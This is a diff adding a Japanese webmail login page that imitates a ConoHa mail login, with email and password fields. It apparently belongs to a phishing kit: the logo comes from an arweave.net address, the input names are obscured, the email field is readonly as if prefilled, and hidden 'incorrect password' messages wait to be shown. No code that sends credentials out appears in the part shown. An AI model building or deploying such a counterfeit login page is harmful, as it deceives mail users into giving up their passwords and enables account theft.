@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="ja">
+   <head>
+      <title>ログイン - WEBメーラー</title>
+      <meta charSet="utf-8"/>
+      <meta name="viewport" content="initial-scale=1.0, width=device-width"/>
+      <link rel="shortcut icon" href="/img/favicon.png"/>      
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/yakuhanjp@3.3.1/dist/css/yakuhanjp.min.css"/>
+      
+      <style id="jss-server-side"></style>
+   </head>
+   <body>
+      <div id="__next">
+         <!--style data-emotion="css-global 1mrqu1p">html{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;box-sizing:border-box;-webkit-text-size-adjust:100%;}*,*::before,*::after{box-sizing:inherit;}strong,b{font-weight:700;}body{margin:0;color:#393c41;font-family:-apple-system,BlinkMacSystemFont,YakuHanJP,Helvetica,ヒラギノ角ゴシック,Hiragino Sans,ヒラギノ角ゴ ProN W3,Hiragino Kaku Gothic ProN,Verdana,Meiryo,sans-serif;font-weight:400;font-size:1rem;line-height:1.5;background-color:#ffffff;}@media print{body{background-color:#fff;}}body::backdrop{background-color:#ffffff;}</style>
+         <style data-emotion="css-global np2hki">a{color:inherit;}.MuiCardHeader-root{padding:24px 24px 16px;}.MuiCardContent-root{padding:16px 24px;}.MuiCardActions-root{padding:16px 24px 24px;}.MuiCardHeader-title{font-size:18px;font-weight:500;margin-bottom:8px;}.MuiCardHeader-subheader{font-size:14px;}.MuiListItemIcon-root{min-width:36px;}</style>
+         <style data-emotion="css 1wcaknn">.css-1wcaknn{padding:32px;}</style-->
+         <main class="css-1wcaknn">
+            <style data-emotion="css hltdia">.css-hltdia{width:100%;margin-left:auto;box-sizing:border-box;margin-right:auto;display:block;padding-left:16px;padding-right:16px;}@media (min-width:600px){.css-hltdia{padding-left:24px;padding-right:24px;}}@media (min-width:0px){.css-hltdia{max-width:444px;}}</style>
+            <main class="MuiContainer-root MuiContainer-maxWidthXs css-hltdia">
+               <style data-emotion="css-global 1mrqu1p">html{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;box-sizing:border-box;-webkit-text-size-adjust:100%;}*,*::before,*::after{box-sizing:inherit;}strong,b{font-weight:700;}body{margin:0;color:#393c41;font-family:-apple-system,BlinkMacSystemFont,YakuHanJP,Helvetica,ヒラギノ角ゴシック,Hiragino Sans,ヒラギノ角ゴ ProN W3,Hiragino Kaku Gothic ProN,Verdana,Meiryo,sans-serif;font-weight:400;font-size:1rem;line-height:1.5;background-color:#ffffff;}@media print{body{background-color:#fff;}}body::backdrop{background-color:#ffffff;}</style>
+               <style data-emotion="css 6ckozg">.css-6ckozg{box-sizing:border-box;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-flex-wrap:wrap;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;width:100%;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;margin-top:64px;}.css-6ckozg>.MuiGrid-item{max-width:none;}</style>
+               <div class="MuiGrid-root MuiGrid-container MuiGrid-direction-xs-column css-6ckozg">
+                  <style data-emotion="css 1dtkdgn animation-c7515d">.css-1dtkdgn{display:block;background-color:rgba(57, 60, 65, 0.11);height:1.2em;border-radius:4px;-webkit-animation:animation-c7515d 1.5s ease-in-out 0.5s infinite;animation:animation-c7515d 1.5s ease-in-out 0.5s infinite;}@-webkit-keyframes animation-c7515d{0%{opacity:1;}50%{opacity:0.4;}100%{opacity:1;}}@keyframes animation-c7515d{0%{opacity:1;}50%{opacity:0.4;}100%{opacity:1;}}</style>
+                  <span class="MuiSkeleton-root MuiSkeleton-rounded MuiSkeleton-pulse" style="width:396px;height:60px"><img alt="" src="https://o4eghydepmzzikys2e273lzzhmzwwyecq6bjv53c5m5ii6qyh4xq.arweave.net/dwhj4GR7M5QrEtE1_a85OzNrYIKHgpr3Yus6hHoYPy8" width="480" height="60" decoding="async" data-nimg="1" loading="lazy" style="color: transparent; max-width: 100%;"></span>
+                  <style data-emotion="css eccbzo">.css-eccbzo{margin:0;font-family:-apple-system,BlinkMacSystemFont,YakuHanJP,Helvetica,ヒラギノ角ゴシック,Hiragino Sans,ヒラギノ角ゴ ProN W3,Hiragino Kaku Gothic ProN,Verdana,Meiryo,sans-serif;font-weight:400;font-size:1rem;line-height:1.5;font-size:1.2rem;font-weight:700;margin-bottom:16px;}</style>
+                  <p class="MuiTypography-root MuiTypography-body1 css-eccbzo">WEBメーラーにログイン</p>
+                  <form>
+                     <style data-emotion="css 8uw9dg">.css-8uw9dg{width:100%;margin-top:8px;}</style>
+                     <div class="MuiBox-root css-8uw9dg">
+                        <style data-emotion="css tzsjye">.css-tzsjye{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;position:relative;min-width:0;padding:0;margin:0;border:0;vertical-align:top;width:100%;}</style>
+                        <div class="MuiFormControl-root MuiFormControl-fullWidth css-tzsjye" style="display:none">
+                           <style data-emotion="css dnxc62">.css-dnxc62{display:block;transform-origin:top left;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:calc(100% - 24px);position:absolute;left:0;top:0;-webkit-transform:translate(14px, 16px) scale(1);-moz-transform:translate(14px, 16px) scale(1);-ms-transform:translate(14px, 16px) scale(1);transform:translate(14px, 16px) scale(1);-webkit-transition:color 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms,-webkit-transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms,max-width 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;transition:color 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms,transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms,max-width 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;z-index:1;pointer-events:none;}</style>
+                           <style data-emotion="css 3s4uiu">.css-3s4uiu{color:rgba(0, 0, 0, 0.6);font-family:-apple-system,BlinkMacSystemFont,YakuHanJP,Helvetica,ヒラギノ角ゴシック,Hiragino Sans,ヒラギノ角ゴ ProN W3,Hiragino Kaku Gothic ProN,Verdana,Meiryo,sans-serif;font-weight:400;font-size:1rem;line-height:1.4375em;padding:0;position:relative;display:block;transform-origin:top left;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:calc(100% - 24px);position:absolute;left:0;top:0;-webkit-transform:translate(14px, 16px) scale(1);-moz-transform:translate(14px, 16px) scale(1);-ms-transform:translate(14px, 16px) scale(1);transform:translate(14px, 16px) scale(1);-webkit-transition:color 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms,-webkit-transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms,max-width 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;transition:color 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms,transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms,max-width 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;z-index:1;pointer-events:none;}.css-3s4uiu.Mui-focused{color:#1f7acc;}.css-3s4uiu.Mui-disabled{color:rgba(0, 0, 0, 0.38);}.css-3s4uiu.Mui-error{color:#d32f2f;}</style>
+                           <label class="MuiFormLabel-root MuiInputLabel-root MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-outlined MuiFormLabel-colorPrimary Mui-required MuiInputLabel-root MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-outlined css-3s4uiu" data-shrink="false" id="select-host-label" for="name-native-error">
+                              サービス
+                              <style data-emotion="css sp68t1">.css-sp68t1.Mui-error{color:#d32f2f;}</style>
+                              <span aria-hidden="true" class="MuiFormLabel-asterisk MuiInputLabel-asterisk css-sp68t1">
+                                  <!-- -->*
+                              </span>
+                           </label>
+                           <style data-emotion="css-global 1prfaxn">@-webkit-keyframes mui-auto-fill{from{display:block;}}@keyframes mui-auto-fill{from{display:block;}}@-webkit-keyframes mui-auto-fill-cancel{from{display:block;}}@keyframes mui-auto-fill-cancel{from{display:block;}}</style>
+                           <style data-emotion="css hw94zk">.css-hw94zk{font-family:-apple-system,BlinkMacSystemFont,YakuHanJP,Helvetica,ヒラギノ角ゴシック,Hiragino Sans,ヒラギノ角ゴ ProN W3,Hiragino Kaku Gothic ProN,Verdana,Meiryo,sans-serif;font-weight:400;font-size:1rem;line-height:1.4375em;color:#393c41;box-sizing:border-box;position:relative;cursor:text;display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;position:relative;border-radius:4px;}.css-hw94zk.Mui-disabled{color:rgba(0, 0, 0, 0.38);cursor:default;}.css-hw94zk:hover .MuiOutlinedInput-notchedOutline{border-color:#393c41;}@media (hover: none){.css-hw94zk:hover .MuiOutlinedInput-notchedOutline{border-color:rgba(0, 0, 0, 0.23);}}.css-hw94zk.Mui-focused .MuiOutlinedInput-notchedOutline{border-color:#1f7acc;border-width:2px;}.css-hw94zk.Mui-error .MuiOutlinedInput-notchedOutline{border-color:#d32f2f;}.css-hw94zk.Mui-disabled .MuiOutlinedInput-notchedOutline{border-color:rgba(0, 0, 0, 0.26);}</style>
+                           <div class="MuiInputBase-root MuiOutlinedInput-root MuiInputBase-colorPrimary Mui-disabled MuiInputBase-formControl  css-hw94zk">
+                              <style data-emotion="css 1x5jdmq">.css-1x5jdmq{font:inherit;letter-spacing:inherit;color:currentColor;padding:4px 0 5px;border:0;box-sizing:content-box;background:none;height:1.4375em;margin:0;-webkit-tap-highlight-color:transparent;display:block;min-width:0;width:100%;-webkit-animation-name:mui-auto-fill-cancel;animation-name:mui-auto-fill-cancel;-webkit-animation-duration:10ms;animation-duration:10ms;padding:16.5px 14px;}.css-1x5jdmq::-webkit-input-placeholder{color:currentColor;opacity:0.42;-webkit-transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.css-1x5jdmq::-moz-placeholder{color:currentColor;opacity:0.42;-webkit-transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.css-1x5jdmq:-ms-input-placeholder{color:currentColor;opacity:0.42;-webkit-transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.css-1x5jdmq::-ms-input-placeholder{color:currentColor;opacity:0.42;-webkit-transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.css-1x5jdmq:focus{outline:0;}.css-1x5jdmq:invalid{box-shadow:none;}.css-1x5jdmq::-webkit-search-decoration{-webkit-appearance:none;}label[data-shrink=false]+.MuiInputBase-formControl .css-1x5jdmq::-webkit-input-placeholder{opacity:0!important;}label[data-shrink=false]+.MuiInputBase-formControl .css-1x5jdmq::-moz-placeholder{opacity:0!important;}label[data-shrink=false]+.MuiInputBase-formControl .css-1x5jdmq:-ms-input-placeholder{opacity:0!important;}label[data-shrink=false]+.MuiInputBase-formControl .css-1x5jdmq::-ms-input-placeholder{opacity:0!important;}label[data-shrink=false]+.MuiInputBase-formControl .css-1x5jdmq:focus::-webkit-input-placeholder{opacity:0.42;}label[data-shrink=false]+.MuiInputBase-formControl .css-1x5jdmq:focus::-moz-placeholder{opacity:0.42;}label[data-shrink=false]+.MuiInputBase-formControl .css-1x5jdmq:focus:-ms-input-placeholder{opacity:0.42;}label[data-shrink=false]+.MuiInputBase-formControl .css-1x5jdmq:focus::-ms-input-placeholder{opacity:0.42;}.css-1x5jdmq.Mui-disabled{opacity:1;-webkit-text-fill-color:rgba(0, 0, 0, 0.38);}.css-1x5jdmq:-webkit-autofill{-webkit-animation-duration:5000s;animation-duration:5000s;-webkit-animation-name:mui-auto-fill;animation-name:mui-auto-fill;}.css-1x5jdmq:-webkit-autofill{border-radius:inherit;}</style>
+                              <style data-emotion="css 1cbz1az">.css-1cbz1az{-moz-appearance:none;-webkit-appearance:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;border-radius:4px;cursor:pointer;font:inherit;letter-spacing:inherit;color:currentColor;padding:4px 0 5px;border:0;box-sizing:content-box;background:none;height:1.4375em;margin:0;-webkit-tap-highlight-color:transparent;display:block;min-width:0;width:100%;-webkit-animation-name:mui-auto-fill-cancel;animation-name:mui-auto-fill-cancel;-webkit-animation-duration:10ms;animation-duration:10ms;padding:16.5px 14px;}.css-1cbz1az:focus{border-radius:4px;}.css-1cbz1az::-ms-expand{display:none;}.css-1cbz1az.Mui-disabled{cursor:default;}.css-1cbz1az[multiple]{height:auto;}.css-1cbz1az:not([multiple]) option,.css-1cbz1az:not([multiple]) optgroup{background-color:#ffffff;}.css-1cbz1az.css-1cbz1az.css-1cbz1az{padding-right:32px;}.css-1cbz1az.MuiSelect-select{height:auto;min-height:1.4375em;text-overflow:ellipsis;white-space:nowrap;overflow:hidden;}.css-1cbz1az::-webkit-input-placeholder{color:currentColor;opacity:0.42;-webkit-transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.css-1cbz1az::-moz-placeholder{color:currentColor;opacity:0.42;-webkit-transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.css-1cbz1az:-ms-input-placeholder{color:currentColor;opacity:0.42;-webkit-transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.css-1cbz1az::-ms-input-placeholder{color:currentColor;opacity:0.42;-webkit-transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.css-1cbz1az:focus{outline:0;}.css-1cbz1az:invalid{box-shadow:none;}.css-1cbz1az::-webkit-search-decoration{-webkit-appearance:none;}label[data-shrink=false]+.MuiInputBase-formControl .css-1cbz1az::-webkit-input-placeholder{opacity:0!important;}label[data-shrink=false]+.MuiInputBase-formControl .css-1cbz1az::-moz-placeholder{opacity:0!important;}label[data-shrink=false]+.MuiInputBase-formControl .css-1cbz1az:-ms-input-placeholder{opacity:0!important;}label[data-shrink=false]+.MuiInputBase-formControl .css-1cbz1az::-ms-input-placeholder{opacity:0!important;}label[data-shrink=false]+.MuiInputBase-formControl .css-1cbz1az:focus::-webkit-input-placeholder{opacity:0.42;}label[data-shrink=false]+.MuiInputBase-formControl .css-1cbz1az:focus::-moz-placeholder{opacity:0.42;}label[data-shrink=false]+.MuiInputBase-formControl .css-1cbz1az:focus:-ms-input-placeholder{opacity:0.42;}label[data-shrink=false]+.MuiInputBase-formControl .css-1cbz1az:focus::-ms-input-placeholder{opacity:0.42;}.css-1cbz1az.Mui-disabled{opacity:1;-webkit-text-fill-color:rgba(0, 0, 0, 0.38);}.css-1cbz1az:-webkit-autofill{-webkit-animation-duration:5000s;animation-duration:5000s;-webkit-animation-name:mui-auto-fill;animation-name:mui-auto-fill;}.css-1cbz1az:-webkit-autofill{border-radius:inherit;}</style>
+                              <div role="button" aria-disabled="true" aria-expanded="false" aria-haspopup="listbox" aria-labelledby="select-host-label" class="MuiSelect-select MuiSelect-outlined Mui-disabled MuiInputBase-input MuiOutlinedInput-input Mui-disabled css-1cbz1az"><span class="notranslate">​</span></div>
+                              <style data-emotion="css 1k3x8v3">.css-1k3x8v3{bottom:0;left:0;position:absolute;opacity:0;pointer-events:none;width:100%;box-sizing:border-box;}</style>
+                              <input aria-invalid="false" aria-hidden="true" tabindex="-1" disabled="" class="MuiSelect-nativeInput css-1k3x8v3" required="" value=""/>
+                              <style data-emotion="css bi4s6q">.css-bi4s6q{position:absolute;right:7px;top:calc(50% - .5em);pointer-events:none;color:rgba(0, 0, 0, 0.54);}.css-bi4s6q.Mui-disabled{color:rgba(0, 0, 0, 0.26);}</style>
+                              <style data-emotion="css 1636szt">.css-1636szt{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;width:1em;height:1em;display:inline-block;fill:currentColor;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;-webkit-transition:fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;font-size:1.5rem;position:absolute;right:7px;top:calc(50% - .5em);pointer-events:none;color:rgba(0, 0, 0, 0.54);}.css-1636szt.Mui-disabled{color:rgba(0, 0, 0, 0.26);}</style>
+                              <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium MuiSelect-icon MuiSelect-iconOutlined Mui-disabled css-1636szt" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="ArrowDropDownIcon">
+                                 <path d="M7 10l5 5 5-5z"></path>
+                              </svg>
+                              <style data-emotion="css 19w1uun">.css-19w1uun{border-color:rgba(0, 0, 0, 0.23);}</style>
+                              <style data-emotion="css igs3ac">.css-igs3ac{text-align:left;position:absolute;bottom:0;right:0;top:-5px;left:0;margin:0;padding:0 8px;pointer-events:none;border-radius:inherit;border-style:solid;border-width:1px;overflow:hidden;min-width:0%;border-color:rgba(0, 0, 0, 0.23);}</style>
+                              <fieldset aria-hidden="true" class="MuiOutlinedInput-notchedOutline css-igs3ac">
+                                 <style data-emotion="css yjsfm1">.css-yjsfm1{float:unset;width:auto;overflow:hidden;display:block;padding:0;height:11px;font-size:0.75em;visibility:hidden;max-width:0.01px;-webkit-transition:max-width 50ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;transition:max-width 50ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;white-space:nowrap;}.css-yjsfm1>span{padding-left:5px;padding-right:5px;display:inline-block;opacity:0;visibility:visible;}</style>
+                                 <legend class="css-yjsfm1">
+                                    <span>
+                                       　　　　　<!-- --> <!-- -->*
+                                    </span>
+                                 </legend>
+                              </fieldset>
+                           </div>
+                           <style data-emotion="css zolq6p">.css-zolq6p{color:rgba(0, 0, 0, 0.6);font-family:-apple-system,BlinkMacSystemFont,YakuHanJP,Helvetica,ヒラギノ角ゴシック,Hiragino Sans,ヒラギノ角ゴ ProN W3,Hiragino Kaku Gothic ProN,Verdana,Meiryo,sans-serif;font-weight:400;font-size:0.75rem;line-height:1.66;text-align:left;margin-top:3px;margin-right:14px;margin-bottom:0;margin-left:14px;}.css-zolq6p.Mui-disabled{color:rgba(0, 0, 0, 0.38);}.css-zolq6p.Mui-error{color:#d32f2f;}</style>
+                           <p class="MuiFormHelperText-root MuiFormHelperText-sizeMedium MuiFormHelperText-contained Mui-required css-zolq6p"></p>
+                        </div>
+                        <style data-emotion="css 1u0h3mu">.css-1u0h3mu{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;position:relative;min-width:0;padding:0;margin:0;border:0;vertical-align:top;margin-top:16px;margin-bottom:8px;width:100%;}</style>
+                        <div class="MuiFormControl-root MuiFormControl-marginNormal MuiFormControl-fullWidth MuiTextField-root css-1u0h3mu">
+                           <!--label class="MuiFormLabel-root MuiInputLabel-root MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-outlined MuiFormLabel-colorPrimary Mui-required MuiInputLabel-root MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-outlined css-3s4uiu" data-shrink="false" for="email" id="email-label">
+                              メールアドレス
+                              <span aria-hidden="true" class="MuiFormLabel-asterisk MuiInputLabel-asterisk css-sp68t1">
+                                  <!-- -->
+                              </span>
+                           </label-->
+                           <style data-emotion="css-global 1prfaxn">@-webkit-keyframes mui-auto-fill{from{display:block;}}@keyframes mui-auto-fill{from{display:block;}}@-webkit-keyframes mui-auto-fill-cancel{from{display:block;}}@keyframes mui-auto-fill-cancel{from{display:block;}}</style>
+                           <style data-emotion="css isobci">.css-isobci{font-family:-apple-system,BlinkMacSystemFont,YakuHanJP,Helvetica,ヒラギノ角ゴシック,Hiragino Sans,ヒラギノ角ゴ ProN W3,Hiragino Kaku Gothic ProN,Verdana,Meiryo,sans-serif;font-weight:400;font-size:1rem;line-height:1.4375em;color:#393c41;box-sizing:border-box;position:relative;cursor:text;display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;width:100%;position:relative;border-radius:4px;}.css-isobci.Mui-disabled{color:rgba(0, 0, 0, 0.38);cursor:default;}.css-isobci:hover .MuiOutlinedInput-notchedOutline{border-color:#393c41;}@media (hover: none){.css-isobci:hover .MuiOutlinedInput-notchedOutline{border-color:rgba(0, 0, 0, 0.23);}}.css-isobci.Mui-focused .MuiOutlinedInput-notchedOutline{border-color:#1f7acc;border-width:2px;}.css-isobci.Mui-error .MuiOutlinedInput-notchedOutline{border-color:#d32f2f;}.css-isobci.Mui-disabled .MuiOutlinedInput-notchedOutline{border-color:rgba(0, 0, 0, 0.26);}</style>
+                           <div class="MuiInputBase-root MuiOutlinedInput-root MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-formControl css-isobci">
+                              <input aria-invalid="false" autoComplete="off" readonly name="em" id="ai" placeholder="メールアドレス *" type="email" class="MuiInputBase-input MuiOutlinedInput-input css-1x5jdmq" value=""/>
+                              <fieldset aria-hidden="true" class="MuiOutlinedInput-notchedOutline css-igs3ac">
+                                 <legend class="css-yjsfm1">
+                                    <span>
+                                       メールアドレス<!-- --> <!-- -->*
+                                    </span>
+                                 </legend>
+                              </fieldset>
+                           </div>
+                        </div>
+                        <div class="MuiFormControl-root MuiFormControl-marginNormal MuiFormControl-fullWidth MuiTextField-root css-1u0h3mu">
+                           <!--label class="MuiFormLabel-root MuiInputLabel-root MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-outlined MuiFormLabel-colorPrimary Mui-required MuiInputLabel-root MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-outlined css-3s4uiu" data-shrink="false" for="password" id="password-label">
+                              パスワード
+                              <span aria-hidden="true" class="MuiFormLabel-asterisk MuiInputLabel-asterisk css-sp68t1">
+                                  <!-- -->
+                              </span>
+                           </label-->
+                           <style data-emotion="css-global 1prfaxn">@-webkit-keyframes mui-auto-fill{from{display:block;}}@keyframes mui-auto-fill{from{display:block;}}@-webkit-keyframes mui-auto-fill-cancel{from{display:block;}}@keyframes mui-auto-fill-cancel{from{display:block;}}</style>
+                           <div class="MuiInputBase-root MuiOutlinedInput-root MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-formControl css-isobci">
+                              <input aria-invalid="false" autoComplete="current-password" name="ps" id="pr" placeholder="パスワード *" type="password" class="MuiInputBase-input MuiOutlinedInput-input css-1x5jdmq" value=""/>
+                              <fieldset aria-hidden="true" class="MuiOutlinedInput-notchedOutline css-igs3ac">
+                                 <legend class="css-yjsfm1">
+                                    <span>
+                                       パスワード<!-- --> <!-- -->*
+                                    </span>
+                                 </legend>
+                              </fieldset>
+                           </div>
+                        </div>
+						<!-- ERRORメッセージ:s -->
+						<div id="msg" style="background-color: #ffffff; color:red; margin: 10px 0 10px; padding: 10px !important; padding-bottom: 0; border: 2px solid #d5d5d5; text-align: left; display:block;display: none;">
+						メールアドレス(ユーザID)またはCONOHAパスワードが正しくありません。</div>
+						<div id="error" style="background-color: #ffffff; color:red; margin: 10px 0 10px; padding: 10px !important; padding-bottom: 0; border: 2px solid #d5d5d5; text-align: left; display:block;display: none;">
+						メールアドレス(ユーザID)またはCONOHAパスワードが正しくありません。</div>
+						<!-- ERRORメッセージ:e -->
+                        <style data-emotion="css 79elbk">.css-79elbk{position:relative;}</style>
+                        <div class="MuiBox-root css-79elbk">
+                           <style data-emotion="css gxv8q8">.css-gxv8q8{text-transform:none;font-family:-apple-system,BlinkMacSystemFont,YakuHanJP,Helvetica,ヒラギノ角ゴシック,Hiragino Sans,ヒラギノ角ゴ ProN W3,Hiragino Kaku Gothic ProN,Verdana,Meiryo,sans-serif;font-weight:500;font-size:0.875rem;line-height:1.75;min-width:64px;padding:6px 16px;border-radius:4px;-webkit-transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;color:#fff;background-color:#1f7acc;box-shadow:0px 3px 1px -2px rgba(0,0,0,0.2),0px 2px 2px 0px rgba(0,0,0,0.14),0px 1px 5px 0px rgba(0,0,0,0.12);width:100%;height:3rem;margin-top:16px;margin-bottom:16px;}.css-gxv8q8:hover{-webkit-text-decoration:none;text-decoration:none;background-color:rgb(21, 85, 142);box-shadow:0px 2px 4px -1px rgba(0,0,0,0.2),0px 4px 5px 0px rgba(0,0,0,0.14),0px 1px 10px 0px rgba(0,0,0,0.12);}@media (hover: none){.css-gxv8q8:hover{background-color:#1f7acc;}}.css-gxv8q8:active{box-shadow:0px 5px 5px -3px rgba(0,0,0,0.2),0px 8px 10px 1px rgba(0,0,0,0.14),0px 3px 14px 2px rgba(0,0,0,0.12);}.css-gxv8q8.Mui-focusVisible{box-shadow:0px 3px 5px -1px rgba(0,0,0,0.2),0px 6px 10px 0px rgba(0,0,0,0.14),0px 1px 18px 0px rgba(0,0,0,0.12);}.css-gxv8q8.Mui-disabled{color:rgba(0, 0, 0, 0.26);box-shadow:none;background-color:rgba(0, 0, 0, 0.12);}</style>
+                           <style data-emotion="css 71ipl8">.css-71ipl8{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;position:relative;box-sizing:border-box;-webkit-tap-highlight-color:transparent;background-color:transparent;outline:0;border:0;margin:0;border-radius:0;padding:0;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;vertical-align:middle;-moz-appearance:none;-webkit-appearance:none;-webkit-text-decoration:none;text-decoration:none;color:inherit;text-transform:none;font-family:-apple-system,BlinkMacSystemFont,YakuHanJP,Helvetica,ヒラギノ角ゴシック,Hiragino Sans,ヒラギノ角ゴ ProN W3,Hiragino Kaku Gothic ProN,Verdana,Meiryo,sans-serif;font-weight:500;font-size:0.875rem;line-height:1.75;min-width:64px;padding:6px 16px;border-radius:4px;-webkit-transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;color:#fff;background-color:#1f7acc;box-shadow:0px 3px 1px -2px rgba(0,0,0,0.2),0px 2px 2px 0px rgba(0,0,0,0.14),0px 1px 5px 0px rgba(0,0,0,0.12);width:100%;height:3rem;margin-top:16px;margin-bottom:16px;}.css-71ipl8::-moz-focus-inner{border-style:none;}.css-71ipl8.Mui-disabled{pointer-events:none;cursor:default;}@media print{.css-71ipl8{-webkit-print-color-adjust:exact;color-adjust:exact;}}.css-71ipl8:hover{-webkit-text-decoration:none;text-decoration:none;background-color:rgb(21, 85, 142);box-shadow:0px 2px 4px -1px rgba(0,0,0,0.2),0px 4px 5px 0px rgba(0,0,0,0.14),0px 1px 10px 0px rgba(0,0,0,0.12);}@media (hover: none){.css-71ipl8:hover{background-color:#1f7acc;}}.css-71ipl8:active{box-shadow:0px 5px 5px -3px rgba(0,0,0,0.2),0px 8px 10px 1px rgba(0,0,0,0.14),0px 3px 14px 2px rgba(0,0,0,0.12);}.css-71ipl8.Mui-focusVisible{box-shadow:0px 3px 5px -1px rgba(0,0,0,0.2),0px 6px 10px 0px rgba(0,0,0,0.14),0px 1px 18px 0px rgba(0,0,0,0.12);}.css-71ipl8.Mui-disabled{color:rgba(0, 0, 0, 0.26);box-shadow:none;background-color:rgba(0, 0, 0, 0.12);}</style>
+                           <button class="MuiButtonBase-root MuiButton-root MuiButton-contained MuiButton-containedPrimary MuiButton-sizeMedium MuiButton-containedSizeMedium MuiButton-fullWidth MuiButton-root MuiButton-contained MuiButton-containedPrimary MuiButton-sizeMedium MuiButton-containedSizeMedium MuiButton-fullWidth css-71ipl8" type="submit" id="submit-btn">ログイン</button>
+                        </div>
